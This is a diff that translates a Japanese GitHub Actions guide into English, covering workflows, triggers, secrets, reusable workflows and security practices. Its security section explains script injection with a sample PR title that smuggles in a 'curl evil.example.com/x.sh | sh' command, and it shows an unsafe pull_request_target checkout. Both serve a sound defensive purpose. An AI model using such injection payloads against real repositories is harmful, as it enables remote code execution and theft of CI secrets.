@@ -5,11 +5,11 @@ tags: [github, yaml]
 
 # GitHub Actions
 
-GitHub ネイティブの CI/CD プラットフォーム。ワークフローを YAML で定義し、リポジトリへのイベント（push, PR, schedule 等）に応じて実行する。`gh` CLI と並んで GitHub 運用の中核。
+GitHub's native CI/CD platform. Workflows are defined in YAML and run in response to events on the repository (push, PR, schedule, etc.). Along with the `gh` CLI, it's the core of GitHub operations.
 
-公式: [docs.github.com/actions](https://docs.github.com/en/actions)
+Official: [docs.github.com/actions](https://docs.github.com/en/actions)
 
-## ワークフローの最小形
+## Minimal workflow
 
 `.github/workflows/ci.yaml`:
 
@@ -37,28 +37,28 @@ jobs:
       - run: pnpm run test
 ```
 
-ファイルは必ず `.github/workflows/` 配下。ブランチごとの workflow も可能だが、`main` にある状態がデフォルトの定義として使われる。
+Files must live under `.github/workflows/`. Per-branch workflows are possible, but the version on `main` is used as the default definition.
 
-## トリガー（`on`）
+## Triggers (`on`)
 
-| イベント | 説明 |
+| Event | Description |
 |---|---|
-| `push` | ブランチ・タグへの push |
-| `pull_request` | PR の open / sync / labeled 等 |
-| `schedule` | cron 形式（UTC） |
-| `workflow_dispatch` | 手動実行（UI や API から） |
-| `workflow_call` | 他 workflow から呼び出し（再利用） |
-| `repository_dispatch` | 外部 API からの呼び出し |
-| `release` | リリース作成時 |
-| `issues` / `issue_comment` / `pull_request_review` | 会話系イベント |
+| `push` | Push to a branch or tag |
+| `pull_request` | PR opened / synchronized / labeled, etc. |
+| `schedule` | Cron format (UTC) |
+| `workflow_dispatch` | Manual run (from UI or API) |
+| `workflow_call` | Invoked from another workflow (reuse) |
+| `repository_dispatch` | Invoked from an external API |
+| `release` | On release creation |
+| `issues` / `issue_comment` / `pull_request_review` | Conversation-related events |
 
 ```yaml
 on:
   push:
     branches: [main]
-    paths: ["src/**", "package.json"]    # 特定パス変更時のみ
+    paths: ["src/**", "package.json"]    # only when specific paths change
   schedule:
-    - cron: "0 6 * * 1"                  # 毎週月曜 06:00 UTC
+    - cron: "0 6 * * 1"                  # every Monday 06:00 UTC
   workflow_dispatch:
     inputs:
       environment:
@@ -67,7 +67,7 @@ on:
         default: "staging"
 ```
 
-## Job と Step
+## Jobs and Steps
 
 ```yaml
 jobs:
@@ -79,7 +79,7 @@ jobs:
 
   test:
     runs-on: ubuntu-latest
-    needs: lint                       # lint 成功後に実行
+    needs: lint                       # run after lint succeeds
     strategy:
       matrix:
         node: [20, 22, 24]
@@ -92,32 +92,32 @@ jobs:
       - run: pnpm run test
 ```
 
-| 概念 | 説明 |
+| Concept | Description |
 |---|---|
-| `jobs.<id>.runs-on` | ランナー種別（`ubuntu-latest` / `macos-latest` / `windows-latest` / self-hosted） |
-| `needs` | 依存（完了後に実行） |
-| `strategy.matrix` | 組み合わせ並列実行 |
-| `steps` | `uses`（action 呼び出し） or `run`（シェル実行） |
-| `if` | 条件実行（`${{ github.event_name == 'push' }}` 等） |
+| `jobs.<id>.runs-on` | Runner type (`ubuntu-latest` / `macos-latest` / `windows-latest` / self-hosted) |
+| `needs` | Dependency (runs after completion) |
+| `strategy.matrix` | Parallel execution across combinations |
+| `steps` | `uses` (invoke an action) or `run` (run a shell command) |
+| `if` | Conditional execution (e.g. `${{ github.event_name == 'push' }}`) |
 
-## 主要な公式 / 準公式 Action
+## Key official / quasi-official Actions
 
-| Action | 用途 |
+| Action | Purpose |
 |---|---|
-| `actions/checkout@v7` | リポジトリ取得（必須） |
-| `actions/setup-node@v6` | Node セットアップ + キャッシュ |
-| `pnpm/action-setup@v6` | pnpm インストール |
+| `actions/checkout@v7` | Check out the repository (required) |
+| `actions/setup-node@v6` | Node setup + caching |
+| `pnpm/action-setup@v6` | Install pnpm |
 | `actions/setup-python@v6` | Python |
 | `actions/setup-go@v6` | Go |
-| `actions/cache@v5` | 汎用キャッシュ |
-| `actions/upload-artifact@v7` / `download-artifact@v8` | Job 間のファイル受け渡し |
-| `actions/github-script@v9` | GitHub API を Node で叩く |
-| `softprops/action-gh-release@v3` | リリース作成 |
-| `jdx/mise-action@v4` | mise 経由でツールインストール |
+| `actions/cache@v5` | Generic caching |
+| `actions/upload-artifact@v7` / `download-artifact@v8` | Pass files between jobs |
+| `actions/github-script@v9` | Call the GitHub API from Node |
+| `softprops/action-gh-release@v3` | Create a release |
+| `jdx/mise-action@v4` | Install tools via mise |
 
-バージョンは**メジャー固定 + パッチ追従**（`@v4`）が一般的。完全固定（SHA）が最もセキュアだが更新負荷が高い。
+The common convention is **pin the major version, follow patches** (`@v4`). Full pinning (SHA) is the most secure but has the highest update overhead.
 
-## シークレットと変数
+## Secrets and variables
 
 ### Secrets
 
@@ -128,11 +128,11 @@ steps:
       NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
 ```
 
-`Settings > Secrets and variables > Actions` で登録。**ログに出ると自動マスクされる**が、意図的な出力でも一部漏れ得るので `echo "$TOKEN"` は避ける。
+Registered under `Settings > Secrets and variables > Actions`. **Values are auto-masked when they appear in logs**, but intentional output can still leak partially, so avoid `echo "$TOKEN"`.
 
 ### Variables
 
-非機密の設定値は Variables に（`${{ vars.ENV_NAME }}`）。
+Non-sensitive configuration values go in Variables (`${{ vars.ENV_NAME }}`).
 
 ### Environment
 
@@ -143,31 +143,31 @@ jobs:
     steps: [...]
 ```
 
-Environment ごとに secrets/vars を分離 + approve ゲートを設置できる（production デプロイで必須）。
+Environments let you separate secrets/vars per environment and add approval gates (essential for production deploys).
 
 ## GITHUB_TOKEN
 
-各 job で自動発行される一時トークン。リポジトリへの limited な権限を持つ。デフォルトは read-only（組織設定による）。
+A temporary token automatically issued for each job, with limited permissions on the repository. Default is read-only (depends on org settings).
 
 ```yaml
 permissions:
-  contents: write     # コミット・タグ作成
+  contents: write     # create commits / tags
   pull-requests: write
   issues: write
 ```
 
-**最小権限原則**: 必要なスコープだけ明示的に付与する。
+**Principle of least privilege**: grant only the scopes you actually need, explicitly.
 
-## 並列実行とキャッシュ
+## Parallelism and caching
 
-### キャッシュ
+### Caching
 
 ```yaml
 - uses: actions/setup-node@v6
   with:
-    cache: pnpm                       # 組み込みキャッシュ
+    cache: pnpm                       # built-in cache
 
-# 汎用キャッシュ
+# generic cache
 - uses: actions/cache@v5
   with:
     path: ~/.cache/pnpm
@@ -176,11 +176,11 @@ permissions:
       ${{ runner.os }}-pnpm-
 ```
 
-`setup-node` の `cache: pnpm` を使えば多くの場合 `actions/cache` は不要。
+Using `setup-node`'s `cache: pnpm` makes `actions/cache` unnecessary in most cases.
 
 ### Concurrency
 
-同じ PR に複数 push した際、古い実行をキャンセル:
+Cancel a stale run when multiple pushes hit the same PR:
 
 ```yaml
 concurrency:
@@ -188,9 +188,9 @@ concurrency:
   cancel-in-progress: true
 ```
 
-## 再利用可能 workflow（Reusable workflow）
+## Reusable workflows
 
-`workflow_call` をトリガーに持つ workflow を別 workflow から呼び出す。**job 単位の再利用**で、独立した job として実行される（呼び出し側の Job Summary に別 job として並ぶ）。
+A workflow with `workflow_call` as its trigger, invoked from another workflow. **Reuse at the job level** — it runs as an independent job (shown as a separate job in the caller's Job Summary).
 
 ```yaml
 # .github/workflows/reusable-test.yaml
@@ -223,7 +223,7 @@ jobs:
         run: echo "percent=92" >> "$GITHUB_OUTPUT"
 ```
 
-呼び出し側:
+Caller:
 
 ```yaml
 jobs:
@@ -231,20 +231,20 @@ jobs:
     uses: ./.github/workflows/reusable-test.yaml
     with:
       node-version: "20"
-    secrets: inherit            # 呼び出し元の全 secrets を引き継ぐ
+    secrets: inherit            # pass through all of the caller's secrets
   test-24:
     uses: ./.github/workflows/reusable-test.yaml
     with:
       node-version: "24"
     secrets:
-      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}    # 個別指定
+      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}    # pass explicitly
 ```
 
-組織共通の workflow は `org/.github` リポジトリに置いて `uses: org/.github/.github/workflows/foo.yaml@v1` で参照できる。**他リポジトリ参照時はタグ / SHA を必ず付ける**（`@main` だと再現性が損なわれる）。
+Organization-wide workflows can live in the `org/.github` repository and be referenced as `uses: org/.github/.github/workflows/foo.yaml@v1`. **Always pin a tag or SHA when referencing another repository** (`@main` sacrifices reproducibility).
 
-## Composite Action
+## Composite Actions
 
-複数ステップを 1 つの action にまとめて再利用する。**ステップ単位の再利用**で、呼び出し側 job の中に inline 展開される（独立した job ではない）。
+Bundle multiple steps into a single reusable action. **Reuse at the step level** — it's inlined into the calling job's step list (not an independent job).
 
 ```yaml
 # .github/actions/setup/action.yaml
@@ -271,7 +271,7 @@ runs:
       shell: bash
 ```
 
-呼び出し:
+Invocation:
 
 ```yaml
 - uses: ./.github/actions/setup
@@ -279,24 +279,24 @@ runs:
     node-version: "20"
 ```
 
-注意点:
+Notes:
 
-- composite の `run:` は `shell:` 必須（reusable workflow は不要）
-- `secrets:` を直接受け取れない。呼び出し側で `env:` 経由で渡すか、`inputs:` に明示する
-- 同一リポジトリ参照は `./` 始まり、外部リポジトリ参照は `org/repo/path@ref`
+- A composite's `run:` requires `shell:` (reusable workflows don't need it)
+- Cannot receive `secrets:` directly. Pass them via `env:` on the caller side, or expose them via `inputs:`
+- Same-repo references start with `./`; external-repo references use `org/repo/path@ref`
 
-### 使い分け
+### When to use which
 
-| 観点 | Reusable workflow | Composite action |
+| Aspect | Reusable workflow | Composite action |
 |---|---|---|
-| 単位 | job | step |
-| 独立 job として表示 | される | されない |
-| matrix 展開 | 呼び出し側で可能 | 不可（呼び出し job の matrix に従う） |
-| `secrets:` 受け取り | できる（`secrets: inherit` 可） | できない（input/env で明示） |
-| `runs-on` 指定 | できる | 呼び出し側に従う |
-| 用途 | テスト・ビルド・デプロイ等の **job 全体**の再利用 | セットアップ手順等の **step 列**の再利用 |
+| Unit | job | step |
+| Shown as a separate job | yes | no |
+| Matrix expansion | possible at the caller | not possible (follows the calling job's matrix) |
+| Receiving `secrets:` | yes (`secrets: inherit` available) | no (must be explicit via input/env) |
+| Specifying `runs-on` | possible | follows the caller |
+| Use case | reusing an entire **job** — test, build, deploy, etc. | reusing a **sequence of steps** — e.g. setup routines |
 
-## gh CLI との連携
+## Integration with the gh CLI
 
 ```yaml
 - run: gh pr comment ${{ github.event.pull_request.number }} --body "CI completed"
@@ -304,98 +304,98 @@ runs:
     GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
 ```
 
-gh は `GH_TOKEN` で認証可能。ローカル開発と同じコマンドが CI でも動く。
+`gh` can authenticate via `GH_TOKEN`. The same commands you use locally work in CI.
 
-## セキュリティベストプラクティス
+## Security best practices
 
-GitHub Actions のセキュリティは「**実行コードの信頼境界**」と「**シークレットの取り扱い**」の 2 軸で考える。
+Think of GitHub Actions security along two axes: the **trust boundary of executed code** and **secret handling**.
 
-### 1. `permissions:` を最小化する
+### 1. Minimize `permissions:`
 
-組織設定で `GITHUB_TOKEN` のデフォルト権限を `read` に絞り、必要な job のみ昇格する:
+Restrict the org-level default `GITHUB_TOKEN` permissions to `read`, and escalate only for the jobs that need it:
 
 ```yaml
-# workflow 全体のデフォルトを read-only に
+# default the whole workflow to read-only
 permissions:
   contents: read
 
 jobs:
   release:
     permissions:
-      contents: write     # この job だけタグ作成を許可
-      id-token: write     # OIDC を使う場合
+      contents: write     # allow tag creation only for this job
+      id-token: write     # when using OIDC
     steps: [...]
 ```
 
-job レベルの `permissions:` は workflow レベルの宣言を**完全に置き換える**（マージではない）。job レベルで `contents: write` を書いたら、他のスコープは未付与扱いになる。
+Job-level `permissions:` **completely replaces** the workflow-level declaration (it's not a merge). Once you write `contents: write` at the job level, every other scope is treated as ungranted.
 
-### 2. サードパーティ action は SHA で pin する
+### 2. Pin third-party actions to a SHA
 
-タグ（`@v4`）は書き換え可能。リポジトリが乗っ取られると過去の `v4` タグが悪意ある commit に張り替えられ、CI 経由で secrets が抜かれる。
+Tags (`@v4`) are mutable. If a repository is compromised, a past `v4` tag can be re-pointed to a malicious commit, exfiltrating secrets via CI.
 
 ```yaml
-# NG: タグ参照
+# BAD: tag reference
 - uses: some/action@v4
 
-# OK: 完全 SHA + 確認済みバージョンをコメント
+# GOOD: full SHA + comment with the verified version
 - uses: some/action@e83ad4c089b3186b7a5da8c9d9f8c6c43ceaef5e # v4.2.0
 ```
 
-公式 (`actions/*`, `github/*`) はタグ運用でも実害は少ない。Renovate / Dependabot に SHA 更新を任せれば追随コストは下がる。
+Official actions (`actions/*`, `github/*`) carry little practical risk even with tag-based usage. Letting Renovate / Dependabot handle SHA updates keeps the follow-up cost low.
 
-### 3. Untrusted input によるスクリプトインジェクション
+### 3. Script injection via untrusted input
 
-`${{ github.event.pull_request.title }}` や `${{ github.head_ref }}` のように外部ユーザーが操作できる context を **shell スクリプトに直接展開しない**。フォーク PR のタイトルに `"; curl evil.example.com/x.sh | sh; #` を入れると、`run:` 内で実行される。
+Never expand a context that external users can control — like `${{ github.event.pull_request.title }}` or `${{ github.head_ref }}` — **directly into a shell script**. If a fork PR's title contains `"; curl evil.example.com/x.sh | sh; #`, it executes inside `run:`.
 
 ```yaml
-# NG: シェルに直接展開
+# BAD: expanded directly into the shell
 - run: echo "Title: ${{ github.event.pull_request.title }}"
 
-# OK: env 経由で文字列として注入
+# GOOD: inject as a string via env
 - env:
     TITLE: ${{ github.event.pull_request.title }}
   run: echo "Title: $TITLE"
 ```
 
-危険な context 例: `pull_request.title` / `pull_request.body` / `issue.title` / `issue.body` / `comment.body` / `head_ref` / `head.ref`。
+Dangerous context examples: `pull_request.title` / `pull_request.body` / `issue.title` / `issue.body` / `comment.body` / `head_ref` / `head.ref`.
 
-### 4. `pull_request_target` の取り扱い
+### 4. Handling `pull_request_target`
 
-`pull_request_target` は **PR のフォーク先コードが、ベースリポジトリの secrets と write 権限で動く**特殊イベント。便利だが、フォーク PR を `actions/checkout` の `ref` で指定して checkout したら任意コード実行になる。
+`pull_request_target` is a special event where **the fork PR's code runs with the base repository's secrets and write permissions**. It's convenient, but if you check out the fork PR by its `ref` via `actions/checkout`, you get arbitrary code execution.
 
 ```yaml
-# 危険: PR のコードを secrets 付きで実行してしまう
+# Dangerous: runs the PR's code with secrets attached
 on: pull_request_target
 jobs:
   build:
     steps:
       - uses: actions/checkout@v7
         with:
-          ref: ${{ github.event.pull_request.head.sha }}    # ← 危険
+          ref: ${{ github.event.pull_request.head.sha }}    # ← dangerous
       - run: pnpm test
         env:
           NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
 ```
 
-原則:
+Principles:
 
-- フォーク PR にコメント・ラベル付けを行う等の **read-only な用途**に限定する
-- どうしても PR コードを実行したい場合は `pull_request` を使い、`Settings > Actions > Fork pull request workflows` の承認制を使う
+- Limit it to **read-only** uses, such as commenting on or labeling fork PRs
+- If you must run PR code, use `pull_request` and enable the approval gate under `Settings > Actions > Fork pull request workflows`
 
-### 5. Secrets の取り扱い
+### 5. Secret handling
 
-- **構造化シークレット禁止**: JSON / YAML 全体を 1 secret に格納すると、部分参照したフィールドが masking されない。フィールドごとに secret を分ける
-- **派生 secret は `::add-mask::`**: secret から導出した値（JWT、署名トークン等）を後続ステップで使う場合、`echo "::add-mask::$DERIVED"` で明示的に masking する
-- **CLI 引数で渡さない**: 同一ランナー上の他 job から `ps` で見えうる。env で渡す
-- **fork PR で secrets は渡らない**: `pull_request` イベントではフォークからの PR に secrets が露出しないが、`pull_request_target` では露出する
+- **No structured secrets**: storing an entire JSON/YAML blob in one secret means a field referenced partially won't get masked. Split into one secret per field
+- **Mask derived secrets with `::add-mask::`**: when using a value derived from a secret (JWT, signed token, etc.) in a later step, explicitly mask it with `echo "::add-mask::$DERIVED"`
+- **Don't pass via CLI arguments**: they can be visible to other jobs on the same runner via `ps`. Pass via env instead
+- **Fork PRs don't receive secrets**: for the `pull_request` event, secrets are not exposed to PRs from forks, but with `pull_request_target` they are exposed
 
-### 6. OIDC でクラウド認証する
+### 6. Authenticate to the cloud with OIDC
 
-長期 secret（`AWS_SECRET_ACCESS_KEY` 等）を保存せず、OIDC で短命トークンを取得する:
+Avoid storing long-lived secrets (e.g. `AWS_SECRET_ACCESS_KEY`) — obtain short-lived tokens via OIDC instead:
 
 ```yaml
 permissions:
-  id-token: write       # OIDC token 発行に必須
+  id-token: write       # required to issue an OIDC token
   contents: read
 
 jobs:
@@ -409,30 +409,30 @@ jobs:
       - run: aws s3 sync ./dist s3://my-bucket/
 ```
 
-クラウド側の trust policy で `sub` claim（`repo:org/repo:ref:refs/heads/main` 等）を厳格に絞る。`repo:org/*` のようなワイルドカードは避ける。npm の Trusted Publishers も同じ仕組み（[`standards/npm-trusted-publishers.md`](../../standards/npm-trusted-publishers.md)）。
+Restrict the `sub` claim (e.g. `repo:org/repo:ref:refs/heads/main`) tightly in the cloud-side trust policy. Avoid wildcards like `repo:org/*`. npm's Trusted Publishers uses the same mechanism ([`standards/npm-trusted-publishers.md`](../../standards/npm-trusted-publishers.md)).
 
-### 7. その他
+### 7. Other
 
-- **依存追随**: Renovate / Dependabot で action のバージョンを追随する（[`tools/renovate.md`](../../tools/renovate.md), [`platforms/github/dependabot.md`](dependabot.md)）
-- **シークレットスキャン**: `gitleaks` / `trivy` を CI に組み込む（[`tools/gitleaks.md`](../../tools/gitleaks.md), [`tools/trivy.md`](../../tools/trivy.md)）
-- **Self-hosted runner はリポジトリスコープのみ**: public リポジトリで self-hosted を有効にすると任意コード実行リスクがある
+- **Dependency updates**: keep action versions up to date with Renovate / Dependabot ([`tools/renovate.md`](../../tools/renovate.md), [`platforms/github/dependabot.md`](dependabot.md))
+- **Secret scanning**: integrate `gitleaks` / `trivy` into CI ([`tools/gitleaks.md`](../../tools/gitleaks.md), [`tools/trivy.md`](../../tools/trivy.md))
+- **Self-hosted runners should be repo-scoped only**: enabling self-hosted runners on a public repository creates an arbitrary-code-execution risk
 
-## よく使う context 変数
+## Commonly used context variables
 
-| 変数 | 意味 |
+| Variable | Meaning |
 |---|---|
-| `${{ github.event_name }}` | トリガー名 |
+| `${{ github.event_name }}` | Trigger name |
 | `${{ github.ref }}` | `refs/heads/<branch>` or `refs/tags/<tag>` |
-| `${{ github.ref_name }}` | ブランチ/タグ名のみ |
-| `${{ github.sha }}` | コミット SHA |
-| `${{ github.actor }}` | 実行者 |
-| `${{ github.workspace }}` | チェックアウトディレクトリ |
+| `${{ github.ref_name }}` | Branch/tag name only |
+| `${{ github.sha }}` | Commit SHA |
+| `${{ github.actor }}` | The actor running the workflow |
+| `${{ github.workspace }}` | The checkout directory |
 | `${{ runner.os }}` | `Linux` / `macOS` / `Windows` |
-| `${{ secrets.<NAME> }}` | secret 参照 |
-| `${{ vars.<NAME> }}` | variable 参照 |
-| `${{ steps.<id>.outputs.<name> }}` | 前ステップの出力 |
+| `${{ secrets.<NAME> }}` | Secret reference |
+| `${{ vars.<NAME> }}` | Variable reference |
+| `${{ steps.<id>.outputs.<name> }}` | A previous step's output |
 
-## ステップ間データ受け渡し
+## Passing data between steps
 
 ```yaml
 steps:
@@ -442,34 +442,34 @@ steps:
   - run: echo "Version is ${{ steps.meta.outputs.version }}"
 ```
 
-`$GITHUB_OUTPUT` ファイルに `name=value` 形式で追記。
+Append `name=value` pairs to the `$GITHUB_OUTPUT` file.
 
-### 3. セキュリティスキャンを自動化する
+### 3. Automate security scanning
 
-- **秘密情報の漏洩防止**: [`gitleaks`](../../tools/gitleaks.md) を使用して、ソースコードや履歴に API キーなどの機密情報が含まれていないかスキャンする。
-- **脆弱性診断**: [`trivy`](../../tools/trivy.md) を使用して、依存ライブラリやコンテナイメージ、設定ファイルの既知の脆弱性を検知する。
+- **Prevent secret leaks**: use [`gitleaks`](../../tools/gitleaks.md) to scan source code and history for API keys and other sensitive information.
+- **Vulnerability scanning**: use [`trivy`](../../tools/trivy.md) to detect known vulnerabilities in dependencies, container images, and configuration files.
 
-これらを CI の一部として組み込むことで、リスクを早期に発見できる。
+Building these into CI catches risks early.
 
-## トラブルシュート
+## Troubleshooting
 
 ### `Resource not accessible by integration`
 
-`permissions:` が足りない。エラーメッセージが要求する scope を追加。
+`permissions:` is insufficient. Add the scope requested by the error message.
 
-### ビルドが毎回遅い
+### Builds are always slow
 
-キャッシュが効いていない。`setup-node` の `cache: pnpm` を確認。`actions/cache` の `key` がロックファイルの hash を含んでいるか。
+Caching isn't working. Check `setup-node`'s `cache: pnpm`. Verify `actions/cache`'s `key` includes a hash of the lockfile.
 
-### 外部 action が非推奨になった
+### An external action was deprecated
 
-Renovate で自動更新するか、`actions/*` シリーズの公式版に移行（例: `actions/setup-node@v6` は cache 機能も内蔵）。
+Let Renovate auto-update it, or migrate to the official `actions/*` equivalent (e.g. `actions/setup-node@v6` now has built-in caching too).
 
-### `pull_request` でチェックが走らない
+### Checks don't run on `pull_request`
 
-マージ元が初心者の PR だとワークフローが「承認」されるまで走らない（org 設定次第）。`Settings > Actions > Fork pull request workflows` を確認。
+For PRs from first-time contributors, the workflow may need to be "approved" before it runs (depends on org settings). Check `Settings > Actions > Fork pull request workflows`.
 
-### matrix で特定組み合わせだけ除外
+### Excluding specific combinations in a matrix
 
 ```yaml
 strategy:
@@ -481,15 +481,15 @@ strategy:
         node: 20
 ```
 
-## 他 CI との比較
+## Comparison with other CI systems
 
-| 観点 | GitHub Actions | GitLab CI | CircleCI |
+| Aspect | GitHub Actions | GitLab CI | CircleCI |
 |---|---|---|---|
-| 設定 | YAML（多ファイル可） | YAML（基本 1 ファイル） | YAML |
-| GitHub 連携 | ネイティブ | GitHub app | GitHub app |
-| 無料枠 | 2,000 分/月（public 無制限） | 400 分/月 | 6,000 クレジット/月 |
-| self-hosted | あり | あり | あり |
-| 再利用 | reusable / composite | include | orbs |
-| OIDC | あり（AWS/GCP/Azure） | あり | あり |
+| Configuration | YAML (multiple files allowed) | YAML (basically one file) | YAML |
+| GitHub integration | Native | GitHub app | GitHub app |
+| Free tier | 2,000 min/month (unlimited for public repos) | 400 min/month | 6,000 credits/month |
+| Self-hosted | Yes | Yes | Yes |
+| Reuse | reusable / composite | include | orbs |
+| OIDC | Yes (AWS/GCP/Azure) | Yes | Yes |
 
-GitHub に閉じた運用では Actions がデフォルト選択。
+For workflows contained entirely within GitHub, Actions is the default choice.
